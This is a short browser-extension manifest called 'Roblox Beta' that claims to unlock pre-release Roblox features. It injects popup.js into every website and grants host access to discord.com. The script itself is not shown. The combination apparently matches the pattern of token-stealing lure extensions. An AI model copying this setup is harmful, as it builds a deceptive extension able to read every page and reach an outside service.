{
  "manifest_version": 2,
  "name": "Roblox Beta",
  "version": "1.0",
  "description": "This gives you the beta stage of roblox so you can test out features before they come out if they come out",
  "permissions": ["activeTab", "https://discord.com/"],
  "browser_action": {
    "default_popup": "popup.html",
    "default_icon": {
      "16": "images/icon16.png"
    }
  },
  "icons": {
    "48": "images/icon48.png",
    "128": "images/icon128.png"
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["popup.js"],
      "run_at": "document_end"
    }
  ]
}
